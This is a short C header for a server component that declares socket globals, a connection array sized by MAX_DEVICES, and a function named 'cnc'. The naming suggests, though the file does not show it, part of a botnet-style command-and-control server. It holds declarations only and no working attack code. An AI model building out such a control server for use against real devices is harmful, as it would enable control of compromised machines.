#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include "../config/config.h"
#pragma once


/*
    *    includes/server/server.h
    *    Date: 11/09/21
    *    Author: 0x1CA3
*/


int i;
int d;
int l;
int sns;
int max;
int s_fd;
int active;
int r_data;
int nnum = 1;
int ccon[MAX_DEVICES];
char sb[1024];
fd_set fd_r;
void cnc(int fd_user);